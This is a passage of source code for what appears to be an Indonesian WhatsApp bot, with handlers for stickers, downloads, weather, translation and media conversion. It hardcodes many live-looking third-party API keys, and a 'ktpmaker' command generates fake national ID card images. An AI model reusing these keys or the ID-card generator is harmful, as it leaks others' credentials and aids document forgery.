                m.reply(mess.success)
                } else {
                let sections = [
                {
                title: "CHANGE MENU BOT",
                rows: [
                {title: "Template Image", rowId: `setmenu templateImage`, description: `Change menu bot to Template Image`},
                {title: "Template Video", rowId: `setmenu templateVideo`, description: `Change menu bot to Template Video`},
                {title: "Template Gif", rowId: `setmenu templateGif`, description: `Change menu bot to Template Gif`},
                {title: "Template Message", rowId: `setmenu templateMessage`, description: `Change menu bot to Template Message`}
                ]
                },
                ]
                danta.sendListMsg(m.chat, `pilih aja *${pushname}* Setmenu nya!`, nyoutube, `*Hello Kak* !`, `Pilih Set Menu`, sections, m)
                }
            }
            break
            
//PEMBATAS=======================================
            case 'sticker': case 's': case 'stick': case 'stickergif': case 'sgif': case 'stiker': {
            if (!quoted) throw `*Balas Image Dengan Caption* ${prefix + command}`
            m.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await danta.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('*Maksimal 10 detik!*')
                let media = await quoted.download()
                let encmedia = await danta.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `*Kirim Gambar Dengan Caption* ${prefix + command}\nDurasi *Video 1-9 Detik*`
                }
            }
            break
         case 'patrick': case 'patricksticker': case 'petrik': {
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await danta.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'dogesticker': case 'dogestick': case 'doge': case 'domge': {
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await danta.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'spotifydw': case 'spotify':
			if (args.length == 0) throw (`Usage: ${prefix + command} link`)
                m.reply(mess.wait) 
			kueri = args[0]
                let anuaa = await fetchJson(`https://api.lolhuman.xyz/api/spotify?apikey=e9cc9fe61061b7b6a035856b&url=${kueri}`)
                let msgsaa = await danta.sendImage(m.chat, anuaa.result.thumbnail, `⭔ Title : ${anuaa.result.title}\n⭔ Singer : ${anuaa.result.artists}\n⭔ Duration : ${anuaa.result.duration}\n⭔ Popularity : ${anuaa.result.popularity}\n⭔ URL : ${anuaa.result.external_urls.spotify}`, m)
                danta.sendMessage(m.chat, { audio: { url: anuaa.result.link }, mimetype: 'audio/mp4', fileName: anuaa.result.title+'.mp3' }, { quoted: m })
				break
				case 'zippyshare': case 'zippydl':
				if (args.length == 0) throw (`Usage: ${prefix + command} link`)
                m.reply(mess.wait) 
			kueri = args[0]
			get_result = await fetchJson(`https://api.lolhuman.xyz/api/zippyshare?apikey=e9cc9fe61061b7b6a035856b&url=${kueri}`)
			get_result = get_result.result
			ini_txt = `[ *ZIPPYSHARE ALTERNATIVE DOWNLOAD* ]\n\n`
			ini_txt += `⭔ Name File : ${get_result.name_file}\n`
			ini_txt += `⭔ Size : ${get_result.size}\n`
			ini_txt += `⭔ Date Upload : ${get_result.date_upload}\n`
			ini_txt += `⭔ Download URL : ${get_result.download_url}\n`
			m.reply(ini_txt)
			break
			case 'mediafire':
				if (args.length == 0) throw (`Usage: ${prefix + command} link`)
                m.reply(mess.wait) 
			kueri = args[0]
			get_result = await fetchJson(`http://zekais-api.herokuapp.com/mediafire?apikey=RGZaUSSk${kueri}`)
			get_result = get_result.result
			ini_txt = `[ *MEDIAFIRE ALTERNATIVE DOWNLOAD* ]\n\n`
			ini_txt += `⭔ Name File : ${get_result.filename}\n`
			ini_txt += `⭔ Type : ${get_result.filetype}\n`
			ini_txt += `⭔ Size : ${get_result.filesize}\n`
			ini_txt += `⭔ Date Upload : ${get_result.uploaded}\n`
			ini_txt += `⭔ Download URL : ${get_result.link}\n`
			m.reply(ini_txt)
			break
			case 'ktpmaker':
			  if (args.length == 0) throw (`Usage: ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\nExample: ${prefix + command} 456127893132123|bumipertiwi|fatamorgana|LoL Human|mars, 99-99-9999|belum ditemukan|jl wardoyo|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/Xb2pZ88/test.jpg`)
                    get_args = args.join(" ").split("|")
                    nik = get_args[0]
                    prov = get_args[1]
                    kabu = get_args[2]
                    name = get_args[3]
                    ttl = get_args[4]
                    jk = get_args[5]
                    jl = get_args[6]
                    rtrw = get_args[7]
                    lurah = get_args[8]
                    camat = get_args[9]
                    agama = get_args[10]
                    nikah = get_args[11]
                    kerja = get_args[12]
                    warga = get_args[13]
                    until = get_args[14]
                    img = get_args[15]
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/ktpmaker?apikey=e9cc9fe61061b7b6a035856b&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=${img}`)
                    danta.sendImage(m.chat, ini_buffer, 'KTPnya kack', m)
                    break
case 'nulis': {
if (args.length < 1) return reply(`Example :\n${prefix}nulis Nama |kelas|black|saya ini anak yg rajin yg mau menulis sendiri`)
const nls = args.join(" ")
const nams = "Nama : " + nls.split("|")[0];
const kels = "Kelas : " + nls.split("|")[1];
const menlise = nls.split("|")[3];
const codewarn = nls.split("|")[2];
await reply('Sedang menulis')
const jangkale = menlise.replace(/(\S+\s*){1,10}/g, '$&\n')
const jangbare = jangkale.split('\n').slice(0, 30).join('\n')
const jangnam = nams.replace(/(\S+\s*){1,10}/g, '$&\n')
const jangkel = kels.replace(/(\S+\s*){1,10}/g, '$&\n')
if (kels.length > 12) return reply("Jumlah teks kelas maximal 4")
if (nams.length > 34) return reply("Jumlah teks nama maximal 27")
if (codewarn.length > 7) return reply("Jumlah teks warna maximal 7")
console.log('「 MENULIS 」Sedang dalam prosses')
spawn('convert', [
'./karuta/magernulis.jpg',
'-fill',
codewarn,
'-font',
'./src/font/nulis.ttf',
'-size',
'1024x784',
'-pointsize',
'20',
'-interline-spacing',
'1',
'-annotate',
'+806+78',
janghar,
'-size',
'1024x784',
'-pointsize',
'18',
'-interline-spacing',
'1',
'-annotate',
'+806+102',
jangwak,
'-size',
'1024x784',
'-pointsize',
'21',
'-interline-spacing',
'1',
'-annotate',
'+285+90',
jangnam,
'-size',
'1024x784',
'-pointsize',
'21',
'-interline-spacing',
'1',
'-annotate',
'+285+110',
jangkel,
'-size',
'1024x784',
'-pointsize',
'20',
'-interline-spacing',
'-7.5',
'-annotate',
'+344+146',
jangbare,
'./src/hasilnulis.jpg'
])
.on('error', () => reply('Error') )
.on('exit', () => {
danta.sendMessage(from, {image:fs.readFileSync('./src/hasilnulis.jpg'), caption:'Succes'}, {quoted:m}).catch(() => reply('```「 GAGAL 」Terjadi kesalahan dalam mengirim file```'))
confirmlimit(sender, 1)
})
exec(`npm i marker`)
}
break
					case 'bucinsertifikat':
					case 'sertifikatbucin':
					case 'bucincert':
					if (args.length == 0) throw (`Example: ${prefix + command} Justimun Kentod`)
                   kueri = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/bucinserti?apikey=e9cc9fe61061b7b6a035856b&name=${kueri}`)
                    danta.sendImage(m.chat, ini_buffer, 'Sertifikatnya kack', m)
                    break
					case 'tololsert':
					case 'tololcert':
					case 'tololsertifikat':
					if (args.length == 0) throw (`Example: ${prefix + command} Justimun Kentod`)
                   kueri = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/toloserti?apikey=e9cc9fe61061b7b6a035856b&name=${kueri}`)
                    danta.sendImage(m.chat, ini_buffer, 'Sertifikatnya kack', m)
                    break
					case 'pacarsertifikat':
				case 'pacarcert':

	
                    if (args.length == 0) throw (`Usage: ${prefix + command} nama1|nama2`)
                    get_args = args.join(" ").split("|")
                    nik = get_args[0]
                    prov = get_args[1]
					luxiang = `Selamat yaa ${nik} ❤️ ${prov}`
					ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/pacarserti?apikey=e9cc9fe61061b7b6a035856b&name1=${nik}&name2=${prov}`)
                    danta.sendImage(m.chat, ini_buffer, luxiang, m)
                    break
                    case 'translate':
			if (args.length == 0) throw (`Example: ${prefix + command} en Tahu Bacem\n\n_Bahasa yang didukung dapat dilihat di: https://sites.google.com/site/opti365/translate_codes_`)
                    kode_negara = args[0]
                    args.shift()
                    ini_txt = args.join(" ")
                    get_result = await fetchJson(`https://zenzapis.xyz/information/translate/${kode_negara}?query=${ini_txt}&apikey=0e92565522`)
                   
                    init_txt = `From : Deteksi Bahasa\n`
                    init_txt += `To : ${kode_negara}\n`
                    init_txt += `Original : ${ini_txt}\n`
                    init_txt += `Translated : ${get_result.result}\n`
                    m.reply(init_txt)
                    break
                    case 'weather':{
if(!args[0]) m.reply(" please provide place or location name")
try{
let response = axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${args[0]}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273`)
let res = await response
let name = res.data.name
let Country = res.data.sys.country
let Weather= res.data.weather[0].description
let Temperature = res.data.main.temp + '°C'
let Minimum_Temperature= res.data.main.temp_min + '°C'
let Maximum_Temperature= res.data.main.temp_max + '°C'
let Humidity= res.data.main.humidity + '%'
let Wind= res.data.wind.speed + 'km/h'
m.reply(`🌸 Place: ${name}\n💮 Country: ${Country}\n🌈 Weather: ${Weather}\n🎋 Temperature: ${Temperature}\n💠 Minimum Temperature: ${Minimum_Temperature}\n📛 Maximum Temperature: ${Maximum_Temperature}\n💦 Humidity: ${Humidity}\n🎐 Wind: ${Wind}`)
}catch(e){
m.reply('Lokasi tidak di temukan, silakan masukan nama negara')
 }
 }
break
					case 'cuaca':
					 if (args.length == 0) throw (`Example: ${prefix + command} Yogyakarta`)
                    daerah = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cuaca/${daerah}?apikey=517636953d8591205af480b7`)
                    get_result = get_result.result
                    ini_txt = `⭔ Tempat : ${get_result.tempat}\n`
                    ini_txt += `⭔ Cuaca : ${get_result.cuaca}\n`
                    ini_txt += `⭔ Angin : ${get_result.angin}\n`
                    ini_txt += `⭔ Description : ${get_result.description}\n`
                    ini_txt += `⭔ Kelembapan : ${get_result.kelembapan}\n`
                    ini_txt += `⭔ Suhu : ${get_result.suhu}\n`
                    ini_txt += `⭔ Udara : ${get_result.udara}\n`
                    ini_txt += `⭔ Permukaan laut : ${get_result.permukaan_laut}\n`
                    m.reply(ini_txt)
                    break
                    case 'brainly':
                    if (args.length == 0) throw (`Example: ${prefix + command} Soekarno adalah`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/brainly?apikey=e9cc9fe61061b7b6a035856b&query=${query}`)
                    get_result = get_result.result
                    ini_txt = "[ *BRAINLY SEARCH* ]\n\n"
                    for (var x of get_result) {
                        ini_txt += `⭔ *Pertanyaan* : ${x.question.content}\n`
                        ini_txt += `⭔ *Jawaban* : ${x.answer[0].content}\n\n`
                    }
                    m.reply(ini_txt)
                    break
                    case 'kbbi':
			if (args.length == 0) throw (`Example: ${prefix + command} sabar`)
				kueri = args.join(" ")
			get_result = await fetchJson(`https://api.lolhuman.xyz/api/kbbi?apikey=e9cc9fe61061b7b6a035856b&query=${kueri}`)
			get_result = get_result.result
			ini_txt = `⭔ Nama : ${get_result[0].nama}\n`
			ini_txt += `⭔ Nomor : ${get_result[0].nomor}\n`
			ini_txt += `⭔ Kata Dasar : ${get_result[0].kata_dasar}\n`
			ini_txt += `⭔ Pelafalan : ${get_result[0].pelafalan}\n`
			ini_txt += `⭔ Bentuk Tidak Baku : ${get_result[0].bentuk_tidak_baku}\n`
			ini_txt += `⭔ Varian : ${get_result[0].varian}\n\n`
			ini_txt += `*MAKNA*\n`
			for (var x of get_result) {
				ini_txt += `*Kelas :* \n`
				ini_txt += `⭔ Kode : ${x.makna[0].kelas[0].kode}\n`
				ini_txt += `⭔ Nama : ${x.makna[0].kelas[0].nama}\n`
				ini_txt += `⭔ Deskripsi : ${x.makna[0].kelas[0].deskripsi}\n\n`
				ini_txt += `⭔ Submakna : ${x.makna[0].submakna[0]}\n\n`
				ini_txt += `⭔ Contoh : ${x.makna[0].contoh[0]}\n\n`
			}
			m.reply(ini_txt)
			break
case 'lovesticker': case 'lovestick' : case 'slove': {
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await danta.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'gura': case 'gurastick': {
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await danta.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'paimon': {
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/Paimon')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await danta.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'sanime': case 'animestick': {
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await danta.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'mukelu': case 'lu': {
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/mukelu')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await danta.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
         case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
		if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await danta.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
case 'cerpen':
  if (!q) return reply(`*List*\n${prefix}Cerpen Anak\n${prefix}Cerpen Bahasa Daerah\n${prefix}Cerpen Bahasa Inggris\n${prefix}Cerpen Bahasa Jawa\n${prefix}Cerpen Bahasa Sunda\n${prefix}Cerpen Budaya\n${prefix}Cerpen Cinta\n${prefix}Cerpen Cinta Islami\n${prefix}Cerpen Cinta Pertama\n${prefix}Cerpen Cinta Romantis\n${prefix}Cerpen Cinta Sedih\n${prefix}Cerpen Cinta Segitiga\n${prefix}Cerpen Cinta Sejati\n${prefix}Cerpen Galau\n${prefix}Cerpen Gokil\n${prefix}Cerpen Inspiratif\n${prefix}Cerpen Jepang\n${prefix}Cerpen Kehidupan\n${prefix}Cerpen Keluarga\n${prefix}Cerpen Kisah Nyata\n${prefix}Cerpen Korea\n${prefix}Cerpen Kristen\n${prefix}Cerpen Liburan\n${prefix}Cerpen Lingkungan\n${prefix}Cerpen Lucu\n${prefix}Cerpen Malaysia\n${prefix}Cerpen Mengharukan\n${prefix}Cerpen Misteri\n${prefix}Cerpen Motivasi\n${prefix}Cerpen Nasihat\n${prefix}Cerpen Nasionalisme\n${prefix}Cerpen Olahraga\n${prefix}Cerpen Patah Hati\n${prefix}Cerpen Penantian\n${prefix}Cerpen Pendidikan\n${prefix}Cerpen Pengalaman Pribadi\n${prefix}Cerpen Pengorbanan\n${prefix}Cerpen Penyesalan\n${prefix}Cerpen Perjuangan\n${prefix}Cerpen Perpisahan\n${prefix}Cerpen Persahabatan\n${prefix}Cerpen Petualangan\n${prefix}Cerpen Ramadhan\n${prefix}Cerpen Remaja\n${prefix}Cerpen Renungan\n${prefix}Cerpen Rindu\n${prefix}Cerpen Rohani\n${prefix}Cerpen Romantis\n${prefix}Cerpen Sastra\n${prefix}Cerpen Sedih\n${prefix}Cerpen Sejarah\n${prefix}Cerpen Slice Of Life\n${prefix}Cerpen Terjemahan\n${prefix}Cerpen Thriller`)
let cerpe = await cerpen(q)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
break
	    case 'emojimix2': {
	    if (!text) throw `Example : ${prefix + command} 😅`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anu.results) {
		    let encmedia = await danta.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	       case 'ttp': {
           if (!text) throw `Example : ${prefix + command} text`
           await danta.sendMedia(m.chat, `https://cililitan.herokuapp.com/api/texttopng2?teks=${text}`, 'danta', 'dev', m, {asSticker: true})

         }
         break
         case 'attp':{
         if (!text) throw `Example : ${prefix + command} text`
         await danta.sendMedia(m.chat, `https://cililitan.herokuapp.com/api/attp?teks=${text}`, 'danta', 'dev', m, {asSticker: true})
         
         }
         break
         case 'tts': {
         	if (!text) throw `Example : ${prefix + command} text`
             let tts = await fetchJson(`https://api.akuari.my.id/texttovoice/texttosound_id?query=${text}`)
             danta.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/mpeg', fileName: `${text}.mp3` }, { quoted: fvn })
         	}
         break
	       case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) throw respond
            if (!text) throw respond
	        m.reply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
            let { TelegraPh } = require('./lib/uploader')
            let mee = await danta.downloadAndSaveMediaMessage(quoted)
            let mem = await TelegraPh(mee)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
	        let awikwok = await danta.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(awikwok)
            }
	       break     
	        case 'simih': case 'simisimi': {
            if (!text) throw `Example : ${prefix + command} text`
            hm = await fetchJson(api('zenz', '/api/simisimi', { text : text }, 'apikey'))
            m.reply(hm.result.message)
            }
            break
            case 'toimage': case 'toimg': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
                let media = await danta.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    danta.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case 'tomp4': case 'tovideo': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await danta.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await danta.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            danta.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            danta.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${danta.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            if (!quoted) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            danta.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            /*case 'autostickerpc':
            case 'autostikerpc':
if (!m.isGroup) return m.reply(mess.group)
if (args.length < 1) return m.reply('type autosticker on to activate\ntype autosticker off to disable')
if (args[0]  === 'on'){
if (isAutoStick) return m.reply(`Already activated`)
_autostick.push(from)
fs.writeFileSync('./database/autostickpc.json', JSON.stringify(autosticker))
reply('autosticker pc activated')
} else if (args[0] === 'off'){
let anu = autosticker.indexOf(from)
_autostick.splice(anu, 1)
fs.writeFileSync('./database/autostickpc.json', JSON.stringify(autosticker))
m.reply('autosticker pc deactivated')
}
break*/
            case 'togif': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await danta.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await danta.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
	        case 'tourl': {
                m.reply(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await danta.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
            case 'imagenobg': case 'removebg': case 'remove-bg': {
	    if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await danta.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    danta.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	case 'menfess':
			case 'menfes':
			case 'confes':
			case 'confess': {
				if (m.isGroup) throw mess.private
				if (!text) return m.reply(`*Cara Penggunaan*\n\nKirim perintah ╠➥ ${prefix}${command} nomer|pengirim|pesan\n\nContoh ╠➥ ${prefix}${command} 62831xxxxxxx|ini nama samaran ya|I have a crush on you\n\nContoh 2 : ╠➥ ${prefix}${command} 62831xxxxxxx|crush mu|I have s crush on you\n\nTenang aja privasi aman kok><`)
				let nomor = q.split('|')[0] ? q.split('|')[0] : q
				let saking = q.split('|')[1] ? q.split('|')[1] : q
				let pesan = q.split('|')[2] ? q.split('|')[2] : ''
				if (pesan.length < 1) return m.reply(`Harus di isi semua! ex : menfess 62831xxxxxxxx|orang|hallo kamu`)
				let buttons = [
                    { buttonId: `#menu`, buttonText: { displayText: 'Menu' }, type: 1 },
                    { buttonId: `menfesconfirm ${m.sender}`, buttonText: { displayText: ' Terima Menfess' }, type: 1 },
                    { buttonId: `menfess`, buttonText: { displayText: ' Kirim Menfess' }, type: 1 }
                ]
			danta.sendMessage(`${nomor}@s.whatsapp.net`, { text:`PESAN RAHASIA\n\nHai kak ada Menfess nih!!\n─────────────\n\nDari : _${saking}_ \nPesan : _${pesan}_`, title: 'PESAN RAHASIA DECTETED', footer: 'Ciee ada yang ngirim pesan nih', buttons: buttons, headerType: 5 })
				m.reply(`Sukses Mengirim Menfess!!`)
				}
				break
			case 'menfesconfirm': {
 				 danta.sendMessage(q, { text: `Sudah Di Confirmasi Nih Menfess nyaa🤭` })
				  m.reply(`Terimakasih Menfess Telah Diterima`)
				  }
				break
	    case 'yts': case 'ytsearch': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Author : ${i.author.name}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
                }
                danta.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case 'google': {
                if (!text) throw `Example : ${prefix + command} fatih arridho`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `⭔ *Title* : ${g.title}\n`
                teks += `⭔ *Description* : ${g.snippet}\n`
                teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                })
                }
                break
        case 'gimage': {
       if (!text) throw `Example : ${prefix + command} kaori cicak`
        anu = await fetchJson(`https://api.akuari.my.id/search/googleimage?query=${text}`)
        n = anu.result
        images = n[Math.floor(Math.random() * n.length)]
        let buttons = [
                    {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
                    footer: danta.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                danta.sendMessage(m.chat, buttonMessage, { quoted: m })
        }
        break
	    case 'play':
            case 'ytplay': {
                if (!text) throw `Contoh : ${prefix + command} Story Wa Anime`
                m.reply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 2) return m.reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 2 // -2 limit
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [{
                        buttonId: `ytmp3 ${anu.url}`,
                        buttonText: {
                            displayText: '♫ Audio'
                        },
                        type: 1
                    },
                    {
                        buttonId: `ytmp4 ${anu.url}`,
                        buttonText: {
                            displayText: ' Video'
                        },
                        type: 1
                    }
                ]
                let buttonMessage = {
                    image: {
                        url: anu.thumbnail
                    },
                    caption: `
📄 Title : ${anu.title}
🔎 Ext : Search
